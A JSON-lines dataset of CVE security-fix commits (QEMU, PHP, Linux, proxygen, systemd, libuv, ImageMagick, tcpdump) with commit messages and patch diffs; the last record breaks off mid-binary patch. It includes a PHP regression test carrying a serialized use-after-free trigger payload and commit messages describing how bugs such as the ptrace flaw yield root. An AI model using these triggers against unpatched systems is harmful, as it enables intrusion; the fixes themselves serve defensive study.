{"CVE_ID": "CVE-2013-6399", "CWE_ID": "94", "category": "security", "commit_id": "4b53c2c72cb5541cf394033b528a6fe2a86c0ac1", "commit_message": "From 4b53c2c72cb5541cf394033b528a6fe2a86c0ac1 Mon Sep 17 00:00:00 2001\nFrom: Michael Roth <mdroth@linux.vnet.ibm.com>\nDate: Thu, 3 Apr 2014 19:51:46 +0300\nSubject: [PATCH] virtio: avoid buffer overrun on incoming migration\n\nCVE-2013-6399\n\nvdev->queue_sel is read from the wire, and later used in the\nemulation code as an index into vdev->vq[]. If the value of\nvdev->queue_sel exceeds the length of vdev->vq[], currently\nallocated to be VIRTIO_PCI_QUEUE_MAX elements, subsequent PIO\noperations such as VIRTIO_PCI_QUEUE_PFN can be used to overrun\nthe buffer with arbitrary data originating from the source.\n\nFix this by failing migration if the value from the wire exceeds\nVIRTIO_PCI_QUEUE_MAX.\n\nSigned-off-by: Michael Roth <mdroth@linux.vnet.ibm.com>\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nReviewed-by: Peter Maydell <peter.maydell@linaro.org>\nSigned-off-by: Juan Quintela <quintela@redhat.com>\n---\n hw/virtio/virtio.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n", "diff_code": "diff --git a/hw/virtio/virtio.c b/hw/virtio/virtio.c\nindex 05f05e7..0072542 100644\n--- a/hw/virtio/virtio.c\n+++ b/hw/virtio/virtio.c\n@@ -907,6 +907,9 @@ int virtio_load(VirtIODevice *vdev, QEMUFile *f)\n     qemu_get_8s(f, &vdev->status);\n     qemu_get_8s(f, &vdev->isr);\n     qemu_get_be16s(f, &vdev->queue_sel);\n+    if (vdev->queue_sel >= VIRTIO_PCI_QUEUE_MAX) {\n+        return -1;\n+    }\n     qemu_get_be32s(f, &features);\n \n     if (virtio_set_features(vdev, features) < 0) {\n-- \n1.8.3.1\n\n", "owner": "bonzini", "repo": "qemu", "source": "cve"}
{"CVE_ID": "CVE-2016-5773", "CWE_ID": "416", "category": "security", "commit_id": "f6aef68089221c5ea047d4a74224ee3deead99a6", "commit_message": "From f6aef68089221c5ea047d4a74224ee3deead99a6 Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Mon, 20 Jun 2016 21:35:22 -0700\nSubject: [PATCH] Fix bug #72434: ZipArchive class Use After Free Vulnerability\n in PHP's GC algorithm and unserialize\n\n---\n ext/standard/tests/strings/bug72434.phpt | 33 ++++++++++++++++++++++++\n ext/zip/php_zip.c                        |  9 +++++++\n 2 files changed, 42 insertions(+)\n create mode 100644 ext/standard/tests/strings/bug72434.phpt\n\n", "diff_code": "diff --git a/ext/standard/tests/strings/bug72434.phpt b/ext/standard/tests/strings/bug72434.phpt\nnew file mode 100644\nindex 000000000000..1408b8f578aa\n--- /dev/null\n+++ b/ext/standard/tests/strings/bug72434.phpt\n@@ -0,0 +1,33 @@\n+--TEST--\n+Bug #72434: ZipArchive class Use After Free Vulnerability in PHP's GC algorithm and unserialize\n+--SKIPIF--\n+<?php\n+if(!class_exists('zip')) die('ZipArchive');\n+?>\n+--FILE--\n+<?php\n+// The following array will be serialized and this representation will be freed later on.\n+$free_me = array(new StdClass());\n+// Create our payload and unserialize it.\n+$serialized_payload = 'a:3:{i:1;N;i:2;O:10:\"ZipArchive\":1:{s:8:\"filename\";'.serialize($free_me).'}i:1;R:4;}';\n+$unserialized_payload = unserialize($serialized_payload);\n+gc_collect_cycles();\n+// The reference counter for $free_me is at -1 for PHP 7 right now.\n+// Increment the reference counter by 1 -> rc is 0\n+$a = $unserialized_payload[1];\n+// Increment the reference counter by 1 again -> rc is 1\n+$b = $a;\n+// Trigger free of $free_me (referenced by $m[1]).\n+unset($b);\n+$fill_freed_space_1 = \"filler_zval_1\";\n+$fill_freed_space_2 = \"filler_zval_2\";\n+$fill_freed_space_3 = \"filler_zval_3\";\n+$fill_freed_space_4 = \"filler_zval_4\";\n+debug_zval_dump($unserialized_payload[1]);\n+?>\n+--EXPECTF--\n+array(1) refcount(1){\n+  [0]=>\n+  object(stdClass)#%d (0) refcount(3){\n+  }\n+}\ndiff --git a/ext/zip/php_zip.c b/ext/zip/php_zip.c\nindex 99c293c6d742..57d060f4ff33 100644\n--- a/ext/zip/php_zip.c\n+++ b/ext/zip/php_zip.c\n@@ -1015,6 +1015,14 @@ static int php_zip_has_property(zval *object, zval *member, int type, const zend\n }\n /* }}} */\n \n+static HashTable *php_zip_get_gc(zval *object, zval ***gc_data, int *gc_data_count TSRMLS_DC) /* {{{ */\n+{\n+\t*gc_data = NULL;\n+\t*gc_data_count = 0;\n+\treturn zend_std_get_properties(object TSRMLS_CC);\n+}\n+/* }}} */\n+\n static HashTable *php_zip_get_properties(zval *object TSRMLS_DC)/* {{{ */\n {\n \tze_zip_object *obj;\n@@ -2777,6 +2785,7 @@ static PHP_MINIT_FUNCTION(zip)\n \tzip_object_handlers.clone_obj\t\t= NULL;\n \tzip_object_handlers.get_property_ptr_ptr = php_zip_get_property_ptr_ptr;\n \n+\tzip_object_handlers.get_gc          = php_zip_get_gc;\n \tzip_object_handlers.get_properties = php_zip_get_properties;\n \tzip_object_handlers.read_property\t= php_zip_read_property;\n \tzip_object_handlers.has_property\t= php_zip_has_property;\n", "owner": "php", "repo": "php-src", "source": "cve"}
{"CVE_ID": "CVE-2018-6347", "CWE_ID": "20", "category": "security", "commit_id": "223e0aa6bc7590e86af1e917185a2e0efe160711", "commit_message": "From 223e0aa6bc7590e86af1e917185a2e0efe160711 Mon Sep 17 00:00:00 2001\nFrom: Alan Frindell <afrind@fb.com>\nDate: Thu, 27 Dec 2018 16:11:46 -0800\nSubject: [PATCH] Don't lower lastStreamID_\n\nSummary:\nThis could throw off the logic about what is headers/trailers\nCVE-2018-6347\n\nReviewed By: avasylev, bolekk\n\nDifferential Revision: D13521704\n\nfbshipit-source-id: ed436ff13f191bf04764494973fcb73b35ed1256\n---\n proxygen/lib/http/codec/HTTP2Codec.cpp        |  3 +-\n .../lib/http/codec/test/HTTP2CodecTest.cpp    | 25 +++++++++++++++\n .../test/HTTPDownstreamSessionTest.cpp        | 32 +++++++++++++++++++\n .../lib/http/session/test/HTTPSessionMocks.h  | 11 +++++++\n 4 files changed, 70 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/proxygen/lib/http/codec/HTTP2Codec.cpp b/proxygen/lib/http/codec/HTTP2Codec.cpp\nindex db9a82731..d3095d626 100644\n--- a/proxygen/lib/http/codec/HTTP2Codec.cpp\n+++ b/proxygen/lib/http/codec/HTTP2Codec.cpp\n@@ -987,7 +987,7 @@ ErrorCode HTTP2Codec::checkNewStream(uint32_t streamId, bool trailersAllowed) {\n     VLOG(4) << \"Parsing downstream trailers streamId=\" << streamId;\n   }\n \n-  if (sessionClosing_ != ClosingState::CLOSED) {\n+  if (sessionClosing_ != ClosingState::CLOSED && streamId > lastStreamID_) {\n     lastStreamID_ = streamId;\n   }\n \n@@ -1313,6 +1313,7 @@ size_t HTTP2Codec::generateChunkTerminator(folly::IOBufQueue& /*writeBuf*/,\n size_t HTTP2Codec::generateTrailers(folly::IOBufQueue& writeBuf,\n                                     StreamID stream,\n                                     const HTTPHeaders& trailers) {\n+  VLOG(4) << \"generating TRAILERS for stream=\" << stream;\n   std::vector<compress::Header> allHeaders;\n   CodecUtil::appendHeaders(trailers, allHeaders, HTTP_HEADER_NONE);\n \ndiff --git a/proxygen/lib/http/codec/test/HTTP2CodecTest.cpp b/proxygen/lib/http/codec/test/HTTP2CodecTest.cpp\nindex 22471b13e..c123e0d3a 100644\n--- a/proxygen/lib/http/codec/test/HTTP2CodecTest.cpp\n+++ b/proxygen/lib/http/codec/test/HTTP2CodecTest.cpp\n@@ -2145,3 +2145,28 @@ TEST_F(HTTP2CodecTest, TrailersReplyMissingContinuation) {\n   EXPECT_EQ(upstreamCodec_.getReceivedFrameCount(), 4);\n #endif\n }\n+\n+TEST_F(HTTP2CodecTest, TrailersNotLatest) {\n+  HTTPMessage req = getGetRequest(\"/guacamole\");\n+  req.getHeaders().add(HTTP_HEADER_USER_AGENT, \"coolio\");\n+  upstreamCodec_.generateHeader(output_, 1, req);\n+  upstreamCodec_.generateHeader(output_, 3, req);\n+\n+  HTTPHeaders trailers;\n+  trailers.add(\"x-trailer-1\", \"pico-de-gallo\");\n+  upstreamCodec_.generateTrailers(output_, 1, trailers);\n+  upstreamCodec_.generateHeader(output_, 3, req);\n+\n+  parse();\n+\n+  EXPECT_EQ(callbacks_.messageBegin, 2);\n+  EXPECT_EQ(callbacks_.headersComplete, 2);\n+  EXPECT_EQ(callbacks_.bodyCalls, 0);\n+  EXPECT_EQ(callbacks_.trailers, 1);\n+  EXPECT_NE(nullptr, callbacks_.msg->getTrailers());\n+  EXPECT_EQ(\"pico-de-gallo\",\n+            callbacks_.msg->getTrailers()->getSingleOrEmpty(\"x-trailer-1\"));\n+  EXPECT_EQ(callbacks_.messageComplete, 1);\n+  EXPECT_EQ(callbacks_.streamErrors, 1);\n+  EXPECT_EQ(callbacks_.sessionErrors, 0);\n+}\ndiff --git a/proxygen/lib/http/session/test/HTTPDownstreamSessionTest.cpp b/proxygen/lib/http/session/test/HTTPDownstreamSessionTest.cpp\nindex a54088d95..f3478c52c 100644\n--- a/proxygen/lib/http/session/test/HTTPDownstreamSessionTest.cpp\n+++ b/proxygen/lib/http/session/test/HTTPDownstreamSessionTest.cpp\n@@ -3568,3 +3568,35 @@ TEST_F(HTTP2DownstreamSessionTest, TestSetEgressSettings) {\n   flushRequestsAndLoop();\n   gracefulShutdown();\n }\n+\n+TEST_F(HTTP2DownstreamSessionTest, TestDuplicateRequestStream) {\n+  // Send the following:\n+  // HEADERS id=1\n+  // HEADERS id=2\n+  // HEADERS id=1 (trailers)\n+  // HEADERS id=2 -> contains pseudo-headers after EOM so ignored\n+  auto handler2 = addSimpleStrictHandler();\n+  auto handler1 = addSimpleStrictHandler();\n+  auto streamID1 = sendRequest(\"/withtrailers\", 0, false);\n+  auto streamID2 = sendRequest();\n+  HTTPHeaders trailers;\n+  trailers.add(\"Foo\", \"Bar\");\n+  clientCodec_->generateTrailers(requests_, streamID1, trailers);\n+  clientCodec_->generateEOM(requests_, streamID1);\n+\n+  clientCodec_->generateHeader(requests_, streamID2, getGetRequest(), false);\n+  handler1->expectHeaders();\n+  handler2->expectHeaders();\n+  handler2->expectEOM();\n+  handler1->expectTrailers();\n+  handler1->expectEOM([&] {\n+      handler1->sendReplyWithBody(200, 100);\n+      // 2 got an error after EOM, which gets ignored - need a response to\n+      // cleanly terminate it\n+      handler2->sendReplyWithBody(200, 100);\n+    });\n+  handler1->expectDetachTransaction();\n+  handler2->expectDetachTransaction();\n+  flushRequestsAndLoop();\n+  gracefulShutdown();\n+}\ndiff --git a/proxygen/lib/http/session/test/HTTPSessionMocks.h b/proxygen/lib/http/session/test/HTTPSessionMocks.h\nindex 9af0ea7a2..9b3f81ae0 100644\n--- a/proxygen/lib/http/session/test/HTTPSessionMocks.h\n+++ b/proxygen/lib/http/session/test/HTTPSessionMocks.h\n@@ -221,6 +221,17 @@ class MockHTTPHandler\n         .RetiresOnSaturation();\n   }\n \n+  void expectTrailers(\n+      std::function<void()> callback = std::function<void()>()) {\n+    if (callback) {\n+      EXPECT_CALL(*this, onTrailers(testing::_))\n+          .WillOnce(testing::InvokeWithoutArgs(callback))\n+          .RetiresOnSaturation();\n+    } else {\n+      EXPECT_CALL(*this, onTrailers(testing::_));\n+    }\n+  }\n+\n   void expectTrailers(\n       std::function<void(std::shared_ptr<HTTPHeaders> trailers)> cb) {\n     EXPECT_CALL(*this, onTrailers(testing::_))\n", "owner": "facebook", "repo": "proxygen", "source": "cve"}
{"CVE_ID": "CVE-2019-13272", "CWE_ID": "264", "category": "security", "commit_id": "6994eefb0053799d2e07cd140df6c2ea106c41ee", "commit_message": "From 6994eefb0053799d2e07cd140df6c2ea106c41ee Mon Sep 17 00:00:00 2001\nFrom: Jann Horn <jannh@google.com>\nDate: Thu, 4 Jul 2019 17:32:23 +0200\nSubject: ptrace: Fix ->ptracer_cred handling for PTRACE_TRACEME\n\nFix two issues:\n\nWhen called for PTRACE_TRACEME, ptrace_link() would obtain an RCU\nreference to the parent's objective credentials, then give that pointer\nto get_cred().  However, the object lifetime rules for things like\nstruct cred do not permit unconditionally turning an RCU reference into\na stable reference.\n\nPTRACE_TRACEME records the parent's credentials as if the parent was\nacting as the subject, but that's not the case.  If a malicious\nunprivileged child uses PTRACE_TRACEME and the parent is privileged, and\nat a later point, the parent process becomes attacker-controlled\n(because it drops privileges and calls execve()), the attacker ends up\nwith control over two processes with a privileged ptrace relationship,\nwhich can be abused to ptrace a suid binary and obtain root privileges.\n\nFix both of these by always recording the credentials of the process\nthat is requesting the creation of the ptrace relationship:\ncurrent_cred() can't change under us, and current is the proper subject\nfor access control.\n\nThis change is theoretically userspace-visible, but I am not aware of\nany code that it will actually break.\n\nFixes: 64b875f7ac8a (\"ptrace: Capture the ptracer's creds not PT_PTRACE_CAP\")\nSigned-off-by: Jann Horn <jannh@google.com>\nAcked-by: Oleg Nesterov <oleg@redhat.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel/ptrace.c | 4 +---\n 1 file changed, 1 insertion(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/kernel/ptrace.c b/kernel/ptrace.c\nindex 8456b6e2205f..705887f63288 100644\n--- a/kernel/ptrace.c\n+++ b/kernel/ptrace.c\n@@ -79,9 +79,7 @@ void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,\n  */\n static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)\n {\n-\trcu_read_lock();\n-\t__ptrace_link(child, new_parent, __task_cred(new_parent));\n-\trcu_read_unlock();\n+\t__ptrace_link(child, new_parent, current_cred());\n }\n \n /**\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-10156", "CWE_ID": "264", "category": "security", "commit_id": "06eeacb6fe029804f296b065b3ce91e796e1cd0e", "commit_message": "From 06eeacb6fe029804f296b065b3ce91e796e1cd0e Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Mantas=20Mikul=C4=97nas?= <grawity@gmail.com>\nDate: Fri, 29 Jan 2016 23:36:08 +0200\nSubject: [PATCH] basic: fix touch() creating files with 07777 mode\n\nmode_t is unsigned, so MODE_INVALID < 0 can never be true.\n\nThis fixes a possible DoS where any user could fill /run by writing to\na world-writable /run/systemd/show-status.\n---\n src/basic/fs-util.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/src/basic/fs-util.c b/src/basic/fs-util.c\nindex d31bd6e273f..61b651b573a 100644\n--- a/src/basic/fs-util.c\n+++ b/src/basic/fs-util.c\n@@ -341,7 +341,8 @@ int touch_file(const char *path, bool parents, usec_t stamp, uid_t uid, gid_t gi\n         if (parents)\n                 mkdir_parents(path, 0755);\n \n-        fd = open(path, O_WRONLY|O_CREAT|O_CLOEXEC|O_NOCTTY, mode > 0 ? mode : 0644);\n+        fd = open(path, O_WRONLY|O_CREAT|O_CLOEXEC|O_NOCTTY,\n+                        (mode == 0 || mode == MODE_INVALID) ? 0644 : mode);\n         if (fd < 0)\n                 return -errno;\n \n", "owner": "systemd", "repo": "systemd", "source": "cve"}
{"CVE_ID": "CVE-2015-0278", "CWE_ID": "264", "category": "security", "commit_id": "66ab38918c911bcff025562cf06237d7fedaba0c", "commit_message": "From 66ab38918c911bcff025562cf06237d7fedaba0c Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Sa=C3=BAl=20Ibarra=20Corretg=C3=A9?= <saghul@gmail.com>\nDate: Mon, 10 Feb 2014 17:41:51 +0100\nSubject: [PATCH] unix: call setgoups before calling setuid/setgid\n\nPartial fix for #1093\n---\n src/unix/process.c | 11 +++++++++++\n 1 file changed, 11 insertions(+)\n\n", "diff_code": "diff --git a/src/unix/process.c b/src/unix/process.c\nindex 0fc8f64019..1efd588b86 100644\n--- a/src/unix/process.c\n+++ b/src/unix/process.c\n@@ -330,6 +330,17 @@ static void uv__process_child_init(const uv_process_options_t* options,\n     _exit(127);\n   }\n \n+  if (options->flags & (UV_PROCESS_SETUID | UV_PROCESS_SETGID)) {\n+    /* When dropping privileges from root, the `setgroups` call will\n+     * remove any extraneous groups. If we don't call this, then\n+     * even though our uid has dropped, we may still have groups\n+     * that enable us to do super-user things. This will fail if we\n+     * aren't root, so don't bother checking the return value, this\n+     * is just done as an optimistic privilege dropping function.\n+     */\n+    SAVE_ERRNO(setgroups(0, NULL));\n+  }\n+\n   if ((options->flags & UV_PROCESS_SETGID) && setgid(options->gid)) {\n     uv__write_int(error_fd, -errno);\n     perror(\"setgid()\");\n", "owner": "libuv", "repo": "libuv", "source": "cve"}
{"CVE_ID": "CVE-2015-8894", "CWE_ID": "415", "category": "security", "commit_id": "4f68e9661518463fca523c9726bb5d940a2aa6d8", "commit_message": "From 4f68e9661518463fca523c9726bb5d940a2aa6d8 Mon Sep 17 00:00:00 2001\nFrom: Cristy <urban-warrior@imagemagick.org>\nDate: Mon, 31 Aug 2015 16:19:40 -0400\nSubject: [PATCH] \n https://bugs.launchpad.net/ubuntu/+source/imagemagick/+bug/1490362\n\n---\n coders/tga.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n", "diff_code": "diff --git a/coders/tga.c b/coders/tga.c\nindex c2d760425d..781933dfbd 100644\n--- a/coders/tga.c\n+++ b/coders/tga.c\n@@ -315,6 +315,8 @@ static Image *ReadTGAImage(const ImageInfo *image_info,\n       /*\n         Read TGA raster colormap.\n       */\n+      if (image->colors < tga_info.colormap_index)\n+        image->colors=tga_info.colormap_index;\n       if (AcquireImageColormap(image,image->colors,exception) == MagickFalse)\n         ThrowReaderException(ResourceLimitError,\"MemoryAllocationFailed\");\n       for (i=0; i < (ssize_t) tga_info.colormap_index; i++)\n", "owner": "ImageMagick", "repo": "ImageMagick", "source": "cve"}
{"CVE_ID": "CVE-2014-2739", "CWE_ID": "20", "category": "security", "commit_id": "b2853fd6c2d0f383dbdf7427e263eb576a633867", "commit_message": "From b2853fd6c2d0f383dbdf7427e263eb576a633867 Mon Sep 17 00:00:00 2001\nFrom: Moni Shoua <monis@mellanox.com>\nDate: Thu, 27 Mar 2014 10:52:58 +0200\nSubject: IB/core: Don't resolve passive side RoCE L2 address in CMA REQ\n handler\n\nThe code that resolves the passive side source MAC within the rdma_cm\nconnection request handler was both redundant and buggy, so remove it.\n\nIt was redundant since later, when an RC QP is modified to RTR state,\nthe resolution will take place in the ib_core module.  It was buggy\nbecause this callback also deals with UD SIDR exchange, for which we\nincorrectly looked at the REQ member of the CM event and dereferenced\na random value.\n\nFixes: dd5f03beb4f7 (\"IB/core: Ethernet L2 attributes in verbs/cm structures\")\nSigned-off-by: Moni Shoua <monis@mellanox.com>\nSigned-off-by: Or Gerlitz <ogerlitz@mellanox.com>\nSigned-off-by: Roland Dreier <roland@purestorage.com>\n---\n drivers/infiniband/core/cm.c  | 17 -----------------\n drivers/infiniband/core/cma.c | 26 --------------------------\n include/rdma/ib_cm.h          |  1 -\n 3 files changed, 44 deletions(-)\n\n", "diff_code": "diff --git a/drivers/infiniband/core/cm.c b/drivers/infiniband/core/cm.c\nindex 0601b9daf840..c3239170d8b7 100644\n--- a/drivers/infiniband/core/cm.c\n+++ b/drivers/infiniband/core/cm.c\n@@ -349,23 +349,6 @@ static void cm_init_av_for_response(struct cm_port *port, struct ib_wc *wc,\n \t\t\t   grh, &av->ah_attr);\n }\n \n-int ib_update_cm_av(struct ib_cm_id *id, const u8 *smac, const u8 *alt_smac)\n-{\n-\tstruct cm_id_private *cm_id_priv;\n-\n-\tcm_id_priv = container_of(id, struct cm_id_private, id);\n-\n-\tif (smac != NULL)\n-\t\tmemcpy(cm_id_priv->av.smac, smac, sizeof(cm_id_priv->av.smac));\n-\n-\tif (alt_smac != NULL)\n-\t\tmemcpy(cm_id_priv->alt_av.smac, alt_smac,\n-\t\t       sizeof(cm_id_priv->alt_av.smac));\n-\n-\treturn 0;\n-}\n-EXPORT_SYMBOL(ib_update_cm_av);\n-\n static int cm_init_av_by_path(struct ib_sa_path_rec *path, struct cm_av *av)\n {\n \tstruct cm_device *cm_dev;\ndiff --git a/drivers/infiniband/core/cma.c b/drivers/infiniband/core/cma.c\nindex 199958d9ddc8..42c3058e6e9c 100644\n--- a/drivers/infiniband/core/cma.c\n+++ b/drivers/infiniband/core/cma.c\n@@ -1284,15 +1284,6 @@ static int cma_req_handler(struct ib_cm_id *cm_id, struct ib_cm_event *ib_event)\n \tstruct rdma_id_private *listen_id, *conn_id;\n \tstruct rdma_cm_event event;\n \tint offset, ret;\n-\tu8 smac[ETH_ALEN];\n-\tu8 alt_smac[ETH_ALEN];\n-\tu8 *psmac = smac;\n-\tu8 *palt_smac = alt_smac;\n-\tint is_iboe = ((rdma_node_get_transport(cm_id->device->node_type) ==\n-\t\t\tRDMA_TRANSPORT_IB) &&\n-\t\t       (rdma_port_get_link_layer(cm_id->device,\n-\t\t\tib_event->param.req_rcvd.port) ==\n-\t\t\tIB_LINK_LAYER_ETHERNET));\n \n \tlisten_id = cm_id->context;\n \tif (!cma_check_req_qp_type(&listen_id->id, ib_event))\n@@ -1336,28 +1327,11 @@ static int cma_req_handler(struct ib_cm_id *cm_id, struct ib_cm_event *ib_event)\n \tret = conn_id->id.event_handler(&conn_id->id, &event);\n \tif (ret)\n \t\tgoto err3;\n-\n-\tif (is_iboe) {\n-\t\tif (ib_event->param.req_rcvd.primary_path != NULL)\n-\t\t\trdma_addr_find_smac_by_sgid(\n-\t\t\t\t&ib_event->param.req_rcvd.primary_path->sgid,\n-\t\t\t\tpsmac, NULL);\n-\t\telse\n-\t\t\tpsmac = NULL;\n-\t\tif (ib_event->param.req_rcvd.alternate_path != NULL)\n-\t\t\trdma_addr_find_smac_by_sgid(\n-\t\t\t\t&ib_event->param.req_rcvd.alternate_path->sgid,\n-\t\t\t\tpalt_smac, NULL);\n-\t\telse\n-\t\t\tpalt_smac = NULL;\n-\t}\n \t/*\n \t * Acquire mutex to prevent user executing rdma_destroy_id()\n \t * while we're accessing the cm_id.\n \t */\n \tmutex_lock(&lock);\n-\tif (is_iboe)\n-\t\tib_update_cm_av(cm_id, psmac, palt_smac);\n \tif (cma_comp(conn_id, RDMA_CM_CONNECT) &&\n \t    (conn_id->id.qp_type != IB_QPT_UD))\n \t\tib_send_cm_mra(cm_id, CMA_CM_MRA_SETTING, NULL, 0);\ndiff --git a/include/rdma/ib_cm.h b/include/rdma/ib_cm.h\nindex f29e3a27c2cc..0e3ff30647d5 100644\n--- a/include/rdma/ib_cm.h\n+++ b/include/rdma/ib_cm.h\n@@ -601,5 +601,4 @@ struct ib_cm_sidr_rep_param {\n int ib_send_cm_sidr_rep(struct ib_cm_id *cm_id,\n \t\t\tstruct ib_cm_sidr_rep_param *param);\n \n-int ib_update_cm_av(struct ib_cm_id *id, const u8 *smac, const u8 *alt_smac);\n #endif /* IB_CM_H */\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-13035", "CWE_ID": "119", "category": "security", "commit_id": "571a6f33f47e7a2394fa08f925e534135c29cf1e", "commit_message": "From 571a6f33f47e7a2394fa08f925e534135c29cf1e Mon Sep 17 00:00:00 2001\nFrom: Guy Harris <guy@alum.mit.edu>\nDate: Thu, 23 Mar 2017 14:37:56 -0700\nSubject: [PATCH] CVE-2017-13035/Properly handle IS-IS IDs shorter than a\n system ID (MAC address).\n\nSome of them are variable-length, with a field giving the total length,\nand therefore they can be shorter than 6 octets.  If one is, don't run\npast the end.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.\n---\n print-isoclns.c            |   6 +++-\n tests/TESTLIST             |   1 +\n tests/isis_sysid_asan.out  |  71 +++++++++++++++++++++++++++++++++++++\n tests/isis_sysid_asan.pcap | Bin 0 -> 323 bytes\n 4 files changed, 77 insertions(+), 1 deletion(-)\n create mode 100644 tests/isis_sysid_asan.out\n create mode 100644 tests/isis_sysid_asan.pcap\n\n", "diff_code": "diff --git a/print-isoclns.c b/print-isoclns.c\nindex eb22759be..628550284 100644\n--- a/print-isoclns.c\n+++ b/print-isoclns.c\n@@ -1646,8 +1646,12 @@ isis_print_id(const uint8_t *cp, int id_len)\n     int i;\n     static char id[sizeof(\"xxxx.xxxx.xxxx.yy-zz\")];\n     char *pos = id;\n+    int sysid_len;\n \n-    for (i = 1; i <= SYSTEM_ID_LEN; i++) {\n+    sysid_len = SYSTEM_ID_LEN;\n+    if (sysid_len > id_len)\n+        sysid_len = id_len;\n+    for (i = 1; i <= sysid_len; i++) {\n         snprintf(pos, sizeof(id) - (pos - id), \"%02x\", *cp++);\n \tpos += strlen(pos);\n \tif (i == 2 || i == 4)\ndiff --git a/tests/TESTLIST b/tests/TESTLIST\nindex 1c94dcca1..3adc5c7f3 100644\n--- a/tests/TESTLIST\n+++ b/tests/TESTLIST\n@@ -539,6 +539,7 @@ isis_stlv_asan\t\tisis_stlv_asan.pcap\t\tisis_stlv_asan.out\t-v\n isis_stlv_asan-2\tisis_stlv_asan-2.pcap\t\tisis_stlv_asan-2.out\t-v\n isis_stlv_asan-3\tisis_stlv_asan-3.pcap\t\tisis_stlv_asan-3.out\t-v\n isis_stlv_asan-4\tisis_stlv_asan-4.pcap\t\tisis_stlv_asan-4.out\t-v\n+isis_sysid_asan\t\tisis_sysid_asan.pcap\t\tisis_sysid_asan.out\t-v\n lldp_mgmt_addr_tlv_asan\tlldp_mgmt_addr_tlv_asan.pcap\tlldp_mgmt_addr_tlv_asan.out\t-v\n bootp_asan\t\tbootp_asan.pcap\t\t\tbootp_asan.out\t\t-v\n bootp_asan-2\t\tbootp_asan-2.pcap\t\tbootp_asan-2.out\t-v\ndiff --git a/tests/isis_sysid_asan.out b/tests/isis_sysid_asan.out\nnew file mode 100644\nindex 000000000..0e5a70333\n--- /dev/null\n+++ b/tests/isis_sysid_asan.out\n@@ -0,0 +1,71 @@\n+UI 22! IS-IS, length 469869187\n+\tL2 Lan IIH, hlen: 27, v: 1, pdu-v: 1, sys-id-len: 6 (0), max-area: 224 (224)\n+\t  source-id: fed0.f90f.58af,  holding time: 34047s, Flags: [unknown circuit type 0x00]\n+\t  lan-id:    0105.0088.a204.00, Priority: 65, PDU length: 4096\n+\t    unknown TLV #64, length: 128\n+\t\t0x0000:  ff10 8e12 0001 1b01 0000 6b00 fbcf f90f\n+\t\t0x0010:  58af 84ff 1000 4901 0000 88a2 011c 000c\n+\t\t0x0020:  0281 0083 1b01 0010 019d e000 fed0 f90f\n+\t\t0x0030:  58af 84ff 1000 4101 0500 88a2 011c 0272\n+\t\t0x0040:  0c2a 2205 831b 011c 0010 0000 0583 1b01\n+\t\t0x0050:  0010 01ab e000 fe08 0808 0808 08cb 0808\n+\t\t0x0060:  0808 0808 0808 0880 0008 7f08 0808 0808\n+\t\t0x0070:  08fd 0808 080c 0608 0807 0808 0808 0408\n+\t    Padding TLV #8, length: 8\n+\t    Padding TLV #8, length: 8\n+\t    Padding TLV #8, length: 7\n+\t    Padding TLV #8, length: 8\n+\t    Padding TLV #8, length: 0\n+\t    Padding TLV #8, length: 8\n+\t    unknown TLV #100, length: 0\n+\t    unknown TLV #32, length: 16\n+\t\t0x0000:  2020 2020 3c20 2020 2020 2020 205a 1a31\n+\t    IS Neighbor(s) (variable length) TLV #7, length: 238\n+\t      LAN address length 1 bytes \n+\t\tIS Neighbor: 5a\n+\t\tIS Neighbor: 45\n+\t\tIS Neighbor: 50\n+\t\tIS Neighbor: 48\n+\t\tIS Neighbor: 59\n+\t\tIS Neighbor: 52\n+\t\tIS Neighbor: 5f\n+\t\tIS Neighbor: 43\n+\t\tIS Neighbor: 54\n+\t\tIS Neighbor: 4c\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 00\n+\t\tIS Neighbor: 00\n+\t\tIS Neighbor: 08\n+\t\tIS Neighbor: 00\n+\t\tIS Neighbor: 20\n+\t\tIS Neighbor: 64\n+\t\tIS Neighbor: 00\n+\t\tIS Neighbor: 20\n+\t\tIS Neighbor: 10\n+\t\tIS Neighbor: 20\n+\t\tIS Neighbor: 20\n+\t\tIS Neighbor: 20\n+\t\tIS Neighbor: 20\n+\t\tIS Neighbor: 20\n+\t\tIS Neighbor: 20\n+\t\tIS Neighbor: 20\n+\t\tIS Neighbor: 20 [|isis]\ndiff --git a/tests/isis_sysid_asan.pcap b/tests/isis_sysid_asan.pcap\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..8190b4e6550292613131d3eaed9f2aa2538c1bcb\nGIT binary patch\nliteral 